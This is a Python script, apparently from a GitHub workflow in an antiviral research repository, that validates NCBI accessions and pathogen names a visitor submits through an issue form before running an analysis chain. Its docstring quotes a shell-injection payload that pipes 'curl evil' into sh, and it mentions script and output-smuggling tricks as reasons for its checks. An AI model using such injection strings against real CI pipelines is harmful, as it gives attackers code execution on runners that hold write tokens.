"""Validate a stranger's run request, then run the chain on it.

This is the only place a visitor's text enters the system, so it is the place that decides
what the rest of the repository is allowed to believe. Two rules it exists to enforce:

**Nothing a visitor typed is ever interpolated into a shell command, or into YAML that a
shell will expand.** The workflow passes the raw issue body in an environment variable and
calls this script; the script parses it in Python and calls `chain.one` directly. There is no
`run: python -m hpc_pilots chain --accession ${{ ... }}` anywhere, because that form lets an
accession of `x"; curl evil | sh; "` run as a command on a runner holding a write token.

**An accession is matched against a pattern, not merely cleaned.** Stripping bad characters
turns an attack into a different, valid-looking request; refusing outright leaves a visitor
with a comment that says what was wrong. The pattern is deliberately narrow — NCBI nucleotide
accessions and nothing else — and a genome too large to be viral is refused further down, by
the chain itself, because this is antiviral work.

The pathogen name is free text that ends up in a public page. It is capped, stripped of
control characters, and escaped again at render time in `output/build_site.py`. Escaping in
one place only is how a name like `<script>` eventually runs.

    ISSUE_BODY=... python3 .github/scripts/run_request.py
    INPUT_ACCESSION=NC_002728.1 INPUT_PATHOGEN="Nipah virus" python3 .github/scripts/run_request.py
"""
import json
import os
import re
import sys
import unicodedata
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent.parent
sys.path.insert(0, str(ROOT))

# One NCBI nucleotide accession: one or two letters, an optional underscore, five to nine
# digits, an optional version suffix. NC_045512.2, MN908947.3, AY278741.1 all match.
ACCESSION = re.compile(r"^[A-Za-z]{1,2}_?\d{5,9}(\.\d+)?$")
MAX_SEGMENTS = 12          # influenza A is eight; nothing viral needs more than this
MAX_NAME = 80


class Refused(Exception):
    """A request we will not run, with a sentence the visitor can act on."""


def field(body, label):
    """Pull one field out of a GitHub issue-form body.

    The form renders as `### <label>` followed by a blank line and the value. A missing
    field renders as `_No response_`, which is not a value and must not be treated as one.
    """
    pattern = re.compile(r"^###\s*" + re.escape(label) + r"\s*$", re.M)
    match = pattern.search(body or "")
    if not match:
        return ""
    rest = body[match.end():]
    nxt = re.search(r"^###\s", rest, re.M)
    value = (rest[:nxt.start()] if nxt else rest).strip()
    return "" if value == "_No response_" else value


def clean_accessions(raw):
    if not raw:
        raise Refused("No accession was given.")
    parts = [p.strip() for p in raw.replace("\n", ",").split(",") if p.strip()]
    if not parts:
        raise Refused("No accession was given.")
    if len(parts) > MAX_SEGMENTS:
        raise Refused(f"{len(parts)} accessions were given; the limit is {MAX_SEGMENTS}, "
                      f"which is more segments than any virus has.")
    for part in parts:
        if not ACCESSION.match(part):
            raise Refused(f"`{part[:60]}` is not an NCBI nucleotide accession. Expected "
                          f"something like `NC_002728.1`.")
    return ",".join(parts)


def clean_name(raw, fallback):
    """Strip control characters, collapse whitespace, cap the length. Never reject."""
    text = "".join(ch for ch in (raw or "")
                   if unicodedata.category(ch)[0] != "C")
    text = re.sub(r"\s+", " ", text).strip()
    if not text:
        return fallback
    return text[:MAX_NAME].strip()


def emit(**pairs):
    """Hand values back to the workflow without going through a shell."""
    path = os.environ.get("GITHUB_OUTPUT")
    if not path:
        for key, value in pairs.items():
            print(f"{key}={value}")
        return
    with open(path, "a", encoding="utf-8") as handle:
        for key, value in pairs.items():
            # Multi-line values need the delimiter form; a stray newline in a single-line
            # write is how an output smuggles in an extra variable.
            handle.write(f"{key}<<__EOF__\n{value}\n__EOF__\n")


def main():
    body = os.environ.get("ISSUE_BODY", "")
    raw_accession = os.environ.get("INPUT_ACCESSION") or field(body, "NCBI nucleotide accession")
    raw_name = os.environ.get("INPUT_PATHOGEN") or field(body, "What to call it")

    try:
        accession = clean_accessions(raw_accession)
    except Refused as refusal:
        emit(ok="false", problem=str(refusal))
        print(f"refused: {refusal}", file=sys.stderr)
        return 1

    pathogen = clean_name(raw_name, accession)
    print(f"accession: {accession}\npathogen:  {pathogen}", flush=True)

    from hpc_pilots.chain import one as run_one

    # `holdout=None` is the honest setting for a genome nobody here has looked at: there is
    # nothing of it curated to delete. A visitor asking about a pathogen that *is* already in
    # UniProt gets a result identified through its own entries, and the page says so.
    case = run_one(accession, pathogen=pathogen, holdout=None, record=True)

    stem = re.sub(r"[^A-Za-z0-9]+", "_", accession.split(",")[0]).strip("_")
    cov = case.get("coverage", {})
    emit(ok="true",
         stem=stem,
         accession=accession,
         pathogen=pathogen,
         chains=str(cov.get("chains_ranked")),
         measured=str(cov.get("surface_measured")),
         rows=str(cov.get("surface_rows")),
         seconds=str(round(case.get("seconds") or 0)))
    print(json.dumps(cov, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
